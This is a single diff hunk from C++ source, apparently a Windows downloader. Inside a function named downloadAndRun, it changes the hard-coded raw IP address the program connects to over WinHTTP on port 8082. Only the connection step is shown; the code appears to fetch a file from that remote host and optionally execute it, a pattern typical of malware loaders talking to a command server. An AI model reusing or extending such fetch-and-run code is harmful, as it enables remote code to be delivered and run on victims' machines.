@@ -104,7 +104,7 @@ char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
 	}
 
 	// Step 2: Connect to the server
-	HINTERNET hConnect = WinHttpConnect(hSession, L"42.96.42.99", 8082, 0);
+	HINTERNET hConnect = WinHttpConnect(hSession, L"103.182.16.8", 8082, 0);
 	if (hConnect == NULL) {
 		std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
 		WinHttpCloseHandle(hSession);
